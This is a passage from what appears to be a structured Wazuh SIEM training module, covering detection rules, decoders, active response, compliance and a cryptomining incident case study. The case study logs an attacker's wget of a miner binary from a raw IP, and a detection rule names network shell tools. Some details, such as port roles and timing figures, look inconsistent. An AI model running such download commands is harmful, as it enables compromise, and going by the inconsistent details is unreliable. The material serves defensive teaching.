-->\n<rule id=\"100002\" level=\"10\" frequency=\"1\" timeframe=\"300\">\n  <if_matched_sid>5710</if_matched_sid>  <!-- Failed SSH login -->\n  <if_matched_sid>5715</if_matched_sid>  <!-- Successful SSH login -->\n  <same_source_ip />\n  <description>Failed SSH login followed by success from same IP (possible credential stuffing)</description>\n</rule>\n```\n\n## Decoders: Parsing Raw Logs\n\nDecoders extract fields from raw log messages, preparing data for rule matching.\n\n### Decoder Example: SSH Failed Login\n\n**Raw Log:**\n```\nFailed password for root from 192.168.1.100 port 54321 ssh2\n```\n\n**Decoder:**\n```xml\n<decoder name=\"sshd-failed-password\">\n  <parent>sshd</parent>\n  <prematch>^Failed password for</prematch>\n  <regex>^Failed password for (\\S+) from (\\S+) port (\\d+)</regex>\n  <order>user, srcip, srcport</order>\n</decoder>\n```\n\n**Decoded Fields:**\n```json\n{\n  \"decoder\": \"sshd-failed-password\",\n  \"user\": \"root\",\n  \"srcip\": \"192.168.1.100\",\n  \"srcport\": \"54321\"\n}\n```\n\n### Custom Decoder for Apache Access Log\n\n**Raw Log:**\n```\n192.168.1.50 - - [28/Oct/2024:14:32:15 +0000] \"GET /admin.php HTTP/1.1\" 200 1234\n```\n\n**Decoder:**\n```xml\n<decoder name=\"apache-access\">\n  <parent>apache</parent>\n  <type>apache-access</type>\n  <prematch>^\\d+\\.\\d+\\.\\d+\\.\\d+ - -</prematch>\n  <regex offset=\"after_prematch\">^\\[(\\d+/\\w+/\\d+:\\d+:\\d+:\\d+)\\s+\\S+\\] \"(\\w+) (\\S+) HTTP\\S+\" (\\d+) (\\d+)</regex>\n  <order>timestamp, method, url, status_code, bytes</order>\n</decoder>\n```\n\n## Active Response: Automated Remediation\n\nActive response executes scripts when rules trigger, enabling automated blocking, disabling, or remediation.\n\n### Example 1: Block IP After Brute-Force\n\n**Configuration** (`/var/ossec/etc/ossec.conf`):\n\n```xml\n<active-response>\n  <command>firewall-drop</command>\n  <location>local</location>\n  <rules_id>5712</rules_id>  <!-- SSH brute-force rule -->\n  <timeout>600</timeout>  <!-- Block for 10 minutes -->\n</active-response>\n```\n\n**How It Works:**\n1. Rule 5712 triggers (SSH brute-force detected)\n2. Wazuh executes `firewall-drop.sh` script\n3. Script adds iptables rule: `iptables -I INPUT -s 192.168.1.100 -j DROP`\n4. After 600 seconds, script removes block\n\n### Example 2: Disable User Account After Suspicious Activity\n\n**Configuration:**\n\n```xml\n<active-response>\n  <command>disable-account</command>\n  <location>local</location>\n  <rules_id>100050</rules_id>  <!-- Suspicious privilege escalation -->\n  <timeout>0</timeout>  <!-- Permanent until manual re-enable -->\n</active-response>\n```\n\n**Custom Script** (`/var/ossec/active-response/bin/disable-account.sh`):\n\n```bash\n#!/bin/bash\n# Reads alert data from stdin\nUSER=$(echo $ALERT_DATA | jq -r '.data.user')\n\n# Disable account\nusermod -L $USER\n\n# Log action\nlogger \"Wazuh Active Response: Disabled account $USER due to suspicious activity\"\n```\n\n### Example 3: Restart Service After Tampering\n\n```xml\n<active-response>\n  <command>restart-ossec</command>\n  <location>local</location>\n  <rules_id>550</rules_id>  <!-- Wazuh agent config modified -->\n</active-response>\n```\n\n## Threat Intelligence Integration\n\n### Integration 1: VirusTotal (Hash Lookup)\n\n**Configuration** (`/var/ossec/etc/ossec.conf`):\n\n```xml\n<integration>\n  <name>virustotal</name>\n  <api_key>YOUR_VIRUSTOTAL_API_KEY</api_key>\n  <group>syscheck</group>  <!-- Trigger on FIM events -->\n  <alert_format>json</alert_format>\n</integration>\n```\n\n**How It Works:**\n- FIM detects new executable file\n- Wazuh calculates file hash (SHA256)\n- Queries VirusTotal API\n- If malicious, escalates alert to critical\n\n### Integration 2: MISP (Threat Intelligence Platform)\n\n**Configuration:**\n\n```xml\n<integration>\n  <name>misp</name>\n  <api_key>YOUR_MISP_API_KEY</api_key>\n  <url>https://misp.your-org.com</url>\n  <alert_format>json</alert_format>\n</integration>\n```\n\n**Enriches Alerts With:**\n- Known malicious IPs\n- Malware file hashes\n- C2 domain indicators\n- Threat actor attribution\n\n## Compliance Monitoring\n\nWazuh includes pre-built rules for compliance frameworks.\n\n### PCI-DSS Example: Detect Root Login\n\n```xml\n<rule id=\"5502\" level=\"9\">\n  <if_sid>5500</if_sid>\n  <match>^User=root</match>\n  <description>Root user logged in (PCI-DSS Req 10.2.5)</description>\n  <group>pci_dss_10.2.5,authentication_success,</group>\n</rule>\n```\n\n**PCI-DSS Requirement 10.2.5**: \"Use of and changes to identification and authentication mechanisms – including but not limited to creation of new accounts and elevation of privileges – and all changes, additions, or deletions to accounts with root or administrative privileges.\"\n\n### GDPR Example: Detect Sensitive Data Access\n\n```xml\n<rule id=\"100100\" level=\"8\">\n  <if_sid>5715</if_sid>  <!-- Successful login -->\n  <field name=\"user\">^(dba|admin|root)$</field>\n  <description>Privileged account accessed system (GDPR Article 32)</description>\n  <group>gdpr_IV_32.2,authentication_success,</group>\n</rule>\n```\n\n**GDPR Article 32.2**: \"The controller and processor shall take steps to ensure that any natural person acting under the authority of the controller or the processor who has access to personal data does not process them except on instructions from the controller.\""
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# 🧠 Wazuh Memory Aids\n\n## Wazuh Components: **MAID** (Manager-Agent-Indexer-Dashboard)\n\n- **M**anager: Brain (analysis, rules, alerts)\n- **A**gent: Collector (endpoints)\n- **I**ndexer: Storage (OpenSearch)\n- **D**ashboard: UI (visualization)\n\n**Mnemonic**: \"**M**anagers **A**lways **I**nspect **D**ata\"\n\n---\n\n## Wazuh Modules: **FVR-SCA** (Key Capabilities)\n\n- **F**IM: File Integrity Monitoring\n- **V**ulnerability Detection\n- **R**ootcheck: Rootkit detection\n- **S**CA: Security Configuration Assessment\n\n**Mnemonic**: \"**F**ind **V**ulnerabilities and **R**ootKits with **SC**A\"\n\n---\n\n## Rule Severity Levels: **I-L-M-H-C** (0-15)\n\n- **0-2**: **I**nformational\n- **3-5**: **L**ow\n- **6-9**: **M**edium\n- **10-12**: **H**igh\n- **13-15**: **C**ritical\n\n**Mnemonic**: \"**I** **L**ike **M**y **H**oney **C**rispy\" (ascending severity)\n\n---\n\n## FIM Attributes: **C-M-D** (What FIM Monitors)\n\n- **C**reate: New files\n- **M**odify: File changes\n- **D**elete: Removed files\n\n**Plus**: Permissions, ownership, size, hash\n\n**Mnemonic**: \"**C**atching **M**alware **D**aily\"\n\n---\n\n## Active Response Workflow: **D-E-R** (Detect-Evaluate-Respond)\n\n1. **D**etect: Rule triggers\n2. **E**valuate: Active response checks conditions\n3. **R**espond: Script executes (block IP, disable user, etc.)\n\n**Mnemonic**: \"**D**efenders **E**xecute **R**apid response\"\n\n---\n\n## Wazuh Ports: **1-5-9** (Three Key Ports)\n\n- **1514**: Agent registration\n- **1515**: Agent events\n- **55000**: Wazuh API\n- **9200**: Indexer (OpenSearch)\n\n**Mnemonic**: \"**1-5** for agents, **9** for indexer\"\n\n---\n\n## Compliance Frameworks: **PGH-NTSC** (Supported Out-of-Box)\n\n- **P**CI-DSS\n- **G**DPR\n- **H**IPAA\n- **N**IST 800-53\n- **T**SC SOC2\n\n**Mnemonic**: \"**P**eople **G**et **H**ealthy with **N**ice **T**ea and **S**ecurity **C**hecks\"\n\n---\n\n## Decoder + Rule = Alert (The Formula)\n\n```\nRaw Log → Decoder (parse) → Structured Data → Rule (match) → Alert\n```\n\n**Remember**: \n- **Decoder** = Parser (extracts fields)\n- **Rule** = Logic (matches conditions)\n- **Alert** = Output (notifies SOC)\n\n---\n\n## Wazuh vs. Commercial SIEM: **The Golden Rule**\n\n**\"Wazuh = 80% features at 0% cost\"**\n\nMeaning: Wazuh provides most enterprise SIEM capabilities without licensing fees.\n\n**Trade-off**: Less polish, more DIY, but total control and transparency.\n\n---\n\n## Troubleshooting Flow: **ADM** (Agent-Decoder-Manager)\n\n1. **A**gent: Check agent status (`agent_control -l`)\n2. **D**ecoder: Test log parsing (`/var/ossec/bin/wazuh-logtest`)\n3. **M**anager: Check manager logs (`/var/ossec/logs/ossec.log`)\n\n**Mnemonic**: \"**A**lways **D**ebug **M**ethodically\""
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: Wazuh Detects Crypto Mining Malware at University\n\n## The Incident: Hidden Monero Mining Operation\n\n**Organization**: Large Public University (30,000 students, 5,000 staff, 10,000 endpoints)\n**Threat**: Cryptomining malware (XMRig Monero miner)\n**Date**: March 2024\n**Impact**: 200+ compromised Linux servers, $50K in excess cloud costs\n**Detection Time**: 3 days (before Wazuh), reduced to 2 hours with Wazuh\n**Tool**: Wazuh Open-Source XDR\n\n### Background\n\nThe university's IT department noticed increased AWS costs and sluggish performance on research compute servers. Traditional antivirus missed the threat because the malware used fileless techniques.\n\n**Wazuh Deployment:**\n- 3-node Wazuh cluster (manager + indexer)\n- 10,000 Wazuh agents (Windows labs, Linux servers, faculty workstations)\n- Integrated with university's SIEM\n- Cost: $0 (open-source) vs. $200K+ for commercial EDR\n\n### Attack Timeline\n\n#### Day 1 (March 10): Initial Compromise\n\n**Attacker**: Exploited unpatched Confluence server (CVE-2023-22515)\n\n**Entry Point**: Public-facing wiki server (`wiki.university.edu`)\n\n**Wazuh Vulnerability Detection Alert:**\n\n```json\n{\n  \"rule_id\": 23502,\n  \"level\": 10,\n  \"description\": \"CVE-2023-22515 affects installed package (Atlassian Confluence)\",\n  \"agent\": {\"id\": \"042\", \"name\": \"wiki-server-01\"},\n  \"vulnerability\": {\n    \"cve\": \"CVE-2023-22515\",\n    \"severity\": \"Critical\",\n    \"cvss\": 9.8,\n    \"package\": \"confluence-server-7.19.8\"\n  }\n}\n```\n\n**Problem**: Alert generated but not prioritized (vulnerability scan alerts often ignored due to volume)\n\n#### Day 2 (March 11): Malware Deployment\n\n**02:15 AM**: Attacker uploads webshell (`shell.jsp`) to Confluence\n\n**Wazuh FIM Alert:**\n\n```json\n{\n  \"rule_id\": 550,\n  \"level\": 7,\n  \"description\": \"New file created\",\n  \"agent\": {\"id\": \"042\", \"name\": \"wiki-server-01\"},\n  \"syscheck\": {\n    \"path\": \"/var/atlassian/confluence/webapps/shell.jsp\",\n    \"size\": 4532,\n    \"md5\": \"5d41402abc4b2a76b9719d911017c592\",\n    \"event\": \"added\"\n  }\n}\n```\n\n**02:20 AM**: Webshell downloads XMRig miner\n\n**Wazuh Process Monitoring Alert:**\n\n```json\n{\n  \"rule_id\": 100050,\n  \"level\": 12,\n  \"description\": \"Suspicious process spawned by web application\",\n  \"agent\": {\"id\": \"042\", \"name\": \"wiki-server-01\"},\n  \"data\": {\n    \"process\": \"wget\",\n    \"command_line\": \"wget http://45.77.32.10/xmrig -O /tmp/.cache\",\n    \"parent_process\": \"java\",\n    \"user\": \"confluence\"\n  }\n}\n```\n\n**Key Indicator**: Java process (Confluence) spawning `wget` is highly suspicious\n\n#### Day 2 (March 11): Lateral Movement\n\n**03:00 AM**: Attacker uses stolen SSH keys to spread to research compute cluster (200 servers)\n\n**Wazuh SSH Key Access Alert:**\n\n```json\n{\n  \"rule_id\": 5715,\n  \"level\": 5,\n  \"description\": \"SSH successful login with public key\",\n  \"agent\": {\"id\": \"150\", \"name\": \"compute-node-01\"},\n  \"data\": {\n    \"srcip\": \"10.50.1.42\",  # wiki-server-01 internal IP\n    \"user\": \"research_admin\",\n    \"authentication_method\": \"publickey\"\n  }\n}\n```\n\n**Correlation Opportunity Missed**: No rule to correlate web server SSH-ing to compute nodes\n\n#### Day 3-5 (March 12-14): Cryptomining Operation\n\n**Malware Activity**:\n- XMRig miner runs on 200 servers\n- CPU usage spikes to 90-100%\n- Outbound connections to Monero pool: `pool.supportxmr.com:443`\n\n**Wazuh Rootcheck Alert:**\n\n```json\n{\n  \"rule_id\": 510,\n  \"level\": 7,\n  \"description\": \"Hidden process detected (possible rootkit)\",\n  \"agent\": {\"id\": \"150\", \"name\": \"compute-node-01\"},\n  \"data\": {\n    \"process\": \".cache\",\n    \"details\": \"Process visible in /proc but not in ps output\"\n  }\n}\n```\n\n**Wazuh Network Monitoring Alert (via command output):**\n\n```json\n{\n  \"rule_id\": 100200,\n  \"level\": 10,\n  \"description\": \"Connection to known cryptomining pool detected\",\n  \"agent\": {\"id\": \"150\", \"name\": \"compute-node-01\"},\n  \"data\": {\n    \"dest_ip\": \"162.210.198.85\",\n    \"dest_port\": 443,\n    \"domain\": \"pool.supportxmr.com\"\n  }\n}\n```\n\n### Detection and Response (Day 5)\n\n**08:00 AM**: SOC analyst reviews Wazuh dashboard, notices pattern\n\n**Wazuh Query** (OpenSearch):\n\n```json\nPOST /wazuh-alerts-*/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": [\n        {\"match\": {\"rule.description\": \"cryptomining\"}},\n        {\"range\": {\"timestamp\": {\"gte\": \"now-7d\"}}}\n      ]\n    }\n  },\n  \"aggs\": {\n    \"by_agent\": {\n      \"terms\": {\"field\": \"agent.name\", \"size\": 500}\n    }\n  }\n}\n```\n\n**Result**: 200 unique agents with cryptomining alerts\n\n**Investigation Timeline Reconstruction:**\n\n```bash\n# Wazuh API query to timeline all activity from patient zero\ncurl -k -X GET \"https://localhost:55000/events?agents_list=042&search=shell.jsp\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n```\n\n**Timeline Output:**\n\n```\n2024-03-11 02:15: File created: /var/atlassian/confluence/webapps/shell.jsp\n2024-03-11 02:20: Process spawned: wget http://45.77.32.10/xmrig\n2024-03-11 02:22: File created: /tmp/.cache (XMRig binary)\n2024-03-11 02:25: Process spawned: /tmp/.cache --url=pool.supportxmr.com\n2024-03-11 03:00: SSH connections to 200 compute nodes\n2024-03-11 03:10: XMRig deployed to all 200 nodes\n```\n\n**Containment Actions:**\n\n1. **Isolate Patient Zero**: \n   ```bash\n   # Wazuh Active Response: Block all traffic\n   /var/ossec/active-response/bin/firewall-drop.sh add - 10.50.1.42 1000000\n   ```\n\n2. **Kill Malicious Processes** (all 200 servers):\n   ```bash\n   # Deploy active response via Wazuh API\n   curl -k -X PUT \"https://localhost:55000/active-response?agents_list=150-350\" \\\n     -H \"Authorization: Bearer $TOKEN\" \\\n     -d '{\"command\": \"!kill-process\", \"arguments\": \".cache\"}'\n   ```\n\n3. **Remove Malware Files**:\n   ```bash\n   # Deploy cleanup script via Wazuh agent\n   for i in {150..350}; do\n     /var/ossec/bin/agent_control -b /tmp/.cache -f delete -u $i\n   done\n   ```\n\n4. **Patch Confluence** (all instances):\n   ```bash\n   # Emergency patch deployment\n   ansible-playbook patch_confluence.yml\n   ```\n\n### Post-Incident Analysis\n\n**What Wazuh Detected:**\n\n✅ **Vulnerability**: CVE-2023-22515 on Confluence (10 days before exploit)\n✅ **Webshell Upload**: FIM detected shell.jsp creation\n✅ **Malware Download**: Process monitoring caught wget from web app\n✅ **Lateral Movement**: SSH access from web server to compute nodes\n✅ **Rootkit Behavior**: Hidden process detection\n✅ **C2 Communication**: Network connection to cryptomining pool\n\n**What Was Missed (Before Custom Rules):**\n\n❌ **Correlation**: No rule linking web server → compute cluster SSH\n❌ **Behavioral Baseline**: No alert for abnormal CPU usage\n❌ **Threat Intel**: Cryptomining pool IPs not in blocklist\n\n### Custom Rules Deployed Post-Incident\n\n**Rule 1: Web Server Spawning Network Tools**\n\n```xml\n<rule id=\"100050\" level=\"12\">\n  <if_sid>530</if_sid>  <!-- Process creation -->\n  <field name=\"process.parent.name\">^(java|httpd|nginx|apache2)$</field>\n  <field name=\"process.name\">^(wget|curl|nc|ncat|socat)$</field>\n  <description>Web application spawned network tool (possible webshell)</description>\n  <mitre>\n    <id>T1505.003</id>  <!-- Web Shell -->\n  </mitre>\n</rule>\n```\n\n**Rule 2: SSH from Web Server to Internal Network**\n\n```xml\n<rule id=\"100051\" level=\"10\">\n  <if_sid>5715</if_sid>  <!-- SSH successful login -->\n  <field name=\"srcip\" type=\"pcre2\">^10\\.50\\.1\\.(42|43|44)$</field>  <!-- Web server IPs -->\n  <description>SSH login from web server DMZ to internal network (lateral movement)</description>\n  <mitre>\n    <id>T1021.004</id>  <!-- SSH -->\n    <id>T1570</id>      <!-- Lateral Tool Transfer -->\n  </mitre>\n</rule>\n```\n\n**Rule 3: Excessive CPU Usage**\n\n```xml\n<rule id=\"100052\" level=\"8\">\n  <decoded_as>custom-cpu-monitor</decoded_as>\n  <field name=\"cpu_usage\" type=\"pcre2\">^(9[0-9]|100)$</field>  <!-- 90-100% -->\n  <description>Sustained high CPU usage (possible cryptomining)</description>\n</rule>\n```\n\n### Cost Analysis\n\n**Incident Costs:**\n- AWS compute overages: $50,000\n- Staff remediation time: 120 hours × $75/hr = $9,000\n- **Total**: $59,000\n\n**Wazuh ROI:**\n- Wazuh cost: $0 (open-source)\n- Detection time reduced: 3 days → 2 hours (36x faster)\n- Prevented cost (if continued 30 days): $500,000+\n\n**Commercial EDR Alternative:**\n- CrowdStrike Falcon: $8/endpoint/year × 10,000 = $80,000/year\n- Splunk Enterprise Security: $200,000/year\n\n**Savings with Wazuh: $80,000-$200,000/year**\n\n### University IT Manager Quote\n\n> \"Wazuh gave us enterprise-grade threat detection at a public university budget. We detected a cryptomining outbreak that our $50K/year antivirus missed. The best part? Wazuh cost us nothing but a few days of setup time. For budget-constrained organizations, Wazuh is a game-changer.\"\n> \n> — IT Security Manager, Public University"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions: Test Your Wazuh Mastery\n\n## Question 1: Custom Rule Creation\n\nWrite a Wazuh rule to detect **DCSync attacks** (MITRE T1003.006).\n\n**Context**:\n- Windows Event ID 4662 (Directory Service Access)\n- Object: `{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (Domain controller object)\n- Properties: \n  - `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes)\n  - `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All)\n\n**Your Task**: Write the complete Wazuh rule (XML format) with proper severity, description, and MITRE mapping.\n\n---\n\n## Question 2: Architecture Design\n\nDesign a Wazuh deployment for:\n- 5,000 endpoints (3,000 Windows, 2,000 Linux)\n- 500GB/day log volume\n- 90-day retention\n- High availability required\n\n**Your Architecture Should Include:**\n- Number of Wazuh managers (master/workers)\n- Number of indexer nodes\n- Storage requirements\n- Network design (ports, firewall rules)\n- Backup strategy\n\n---\n\n## Question 3: FIM Configuration\n\nConfigure File Integrity Monitoring for a **web server** running:\n- Apache/Nginx web root: `/var/www/html`\n- Application config: `/etc/nginx/`\n- SSL certificates: `/etc/ssl/`\n\n**Requirements:**\n- Real-time monitoring (not just periodic scans)\n- Alert on file changes, additions, deletions\n- Ignore log files and cache directories\n- Report hash changes for binaries\n\n**Your Task**: Write the `<syscheck>` configuration block in `ossec.conf`.\n\n---\n\n## Question 4: Threat Hunting Query\n\nYou suspect **Kerberoasting** attacks in your environment.\n\n**Hunt Using Wazuh Data:**\n\n1. What Windows Event ID indicates TGS requests?\n2. How do you filter for service accounts (not machine accounts)?\n3. How do you detect RC4 encryption (weak, preferred by attackers)?\n4. Write an OpenSearch query (JSON) to find suspicious Kerberos activity in Wazuh Indexer.\n\n---\n\n## Question 5: Active Response Scenario\n\nCreate an active response that:\n\n**Scenario**: When a user downloads a file flagged as malicious by VirusTotal (via Wazuh integration):\n1. Quarantine the file (move to `/quarantine/`)\n2. Disable the user account temporarily\n3. Send alert to security team (email/Slack)\n\n**Your Tasks:**\n1. Write the `<active-response>` configuration\n2. Write the bash script executed by active response\n3. Explain how to test this without impacting production\n\n---\n\n## Bonus Challenge: Compliance Dashboard\n\nBuild a Wazuh dashboard for **PCI-DSS compliance** with these visualizations:\n\n1. **Top 10 PCI-DSS Rule Violations** (last 30 days)\n2. **Privileged Account Access Timeline** (Req 10.2)\n3. **Failed Login Attempts by Source IP** (Req 10.2.4)\n4. **File Integrity Changes on Cardholder Data Systems** (Req 11.5)\n5. **Vulnerability Scan Results by Severity** (Req 11.2)\n\n**Your Task**:\n- Specify OpenSearch queries for each visualization\n- Define visualization types (bar chart, line chart, heatmap, etc.)\n- List required Wazuh rules/groups\n\n---\n\n**Reflection Goal**: These questions test your ability to **deploy, configure, and operationalize** Wazuh in enterprise environments. True mastery means you can go from zero to production Wazuh deployment."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# 🎯 You've Mastered Wazuh: The Open-Source Security Revolution\n\n## What You've Accomplished\n\n**You Now Understand:**\n\n✅ **XDR Architecture**: Manager, agents, indexer, dashboard - and how they work together\n\n✅ **Detection Engineering**: Writing custom rules and decoders for threat detection\n\n✅ **File Integrity Monitoring**: Detecting unauthorized file changes for compliance and threat detection\n\n✅ **Vulnerability Management**: Automated CVE scanning and patch prioritization\n\n✅ **Active Response**: Automated remediation (blocking IPs, disabling accounts)\n\n✅ **Compliance Monitoring**: PCI-DSS, GDPR, HIPAA, NIST 800-53 reporting\n\n✅ **Threat Intelligence**: Integration with MISP, VirusTotal, and other feeds\n\n**That's not beginner knowledge. That's Wazuh Engineer expertise.**\n\n## The Open-Source Advantage\n\n**Why Wazuh Is Your Career Accelerator:**\n\n**1. Cost Savings = Job Security**\n- Organizations save $80K-$500K/year vs. commercial tools\n- Budget-conscious orgs (SMBs, nonprofits, education) NEED Wazuh expertise\n- You can propose Wazuh deployments that save companies money (instant credibility)\n\n**2. Transparency = Deep Learning**\n- Open-source means you see HOW it works (not a black box)\n- You can modify source code, create custom modules\n- Deep understanding translates to ANY SIEM (Splunk, ELK, QRadar concepts are similar)\n\n**3. Growing Market = High Demand**\n- 50% year-over-year growth\n- 10 million+ downloads\n- Used by NASA, major banks, telecom giants\n- Consulting opportunities (implement Wazuh for SMBs at $100-$200/hour)\n\n## Your 30-Day Wazuh Challenge\n\n### Week 1: Deploy and Configure\n- Install Wazuh all-in-one\n- Deploy 3-5 agents (Windows, Linux, Docker)\n- Configure FIM for critical directories\n- Enable vulnerability detection\n\n### Week 2: Detection Rules\n- Create 10 custom rules:\n  1. Brute-force SSH\n  2. Brute-force RDP\n  3. Webshell upload\n  4. Privilege escalation\n  5. Lateral movement (PSExec)\n  6. Kerberoasting\n  7. Suspicious PowerShell\n  8. Cryptomining indicators\n  9. Data exfiltration (large file transfers)\n  10. Rootkit detection\n\n### Week 3: Compliance & Integration\n- Build PCI-DSS compliance dashboard\n- Integrate VirusTotal\n- Configure active response (block IPs)\n- Set up email alerting\n\n### Week 4: Real-World Simulation\n- Simulate attacks in lab (Metasploit, Mimikatz, etc.)\n- Verify Wazuh detects each attack\n- Fine-tune rules to reduce false positives\n- Document detection logic and response playbooks\n\n**Completion Reward**: Portfolio-ready Wazuh deployment + hands-on detection engineering experience + compliance dashboards\n\n## The Job Market Reality\n\n**Wazuh Skills Are In Demand:**\n\n- **Open-Source SIEM Engineer**: $80K-$110K\n- **Wazuh Consultant**: $100-$200/hour (freelance)\n- **SOC Analyst (Wazuh)**: $70K-$95K\n- **Security Architect (Open-Source Stack)**: $120K-$160K\n\n**Job Opportunities:**\n- SMBs that can't afford Splunk\n- Nonprofits and education (budget-constrained)\n- Startups (cost-conscious)\n- Enterprises migrating from commercial SIEM (cost reduction)\n\n**Your Unique Value**: Wazuh + commercial SIEM knowledge = highly versatile candidate\n\n## Jim Kwik's Principle: **Teach to Master**\n\nCement your Wazuh knowledge by teaching:\n\n- Write a blog: \"Deploy Wazuh in 30 Minutes\"\n- Create a YouTube tutorial: \"Detect Brute-Force Attacks with Wazuh\"\n- Give a presentation: \"Open-Source SIEM: Wazuh vs. Splunk\"\n- Mentor a colleague: \"Build Your First Wazuh Rule\"\n\nTeaching reveals knowledge gaps. Filling those gaps = mastery.\n\n## The Hidden Advantage: Universal SIEM Skills\n\nOnce you master Wazuh:\n- **Splunk**: Rule logic and correlation are similar\n- **ELK Stack**: Wazuh uses OpenSearch (Elasticsearch fork)\n- **QRadar**: Concepts transfer (rules, decoders, correlation)\n- **Microsoft Sentinel**: Detection logic is universal\n\n**Bottom Line**: Wazuh expertise = Foundation for ALL SIEM platforms.\n\n## Final Thoughts\n\nWazuh represents the **democratization of cybersecurity**.\n\n**Old World**: Enterprise security only for Fortune 500 with $500K budgets\n\n**New World (Wazuh)**: Enterprise-grade security for EVERYONE, for FREE\n\nYou now have skills that:\n- Save organizations hundreds of thousands of dollars\n- Detect sophisticated threats (cryptominers, APTs, insider threats)\n- Ensure compliance (PCI-DSS, GDPR, HIPAA)\n- Scale from 10 to 10,000 endpoints\n\n**The Question Is**: What threat will you hunt first?\n\nGo forth and secure the world with open-source XDR. 🛡️🔓"
      }
    }
  ]
}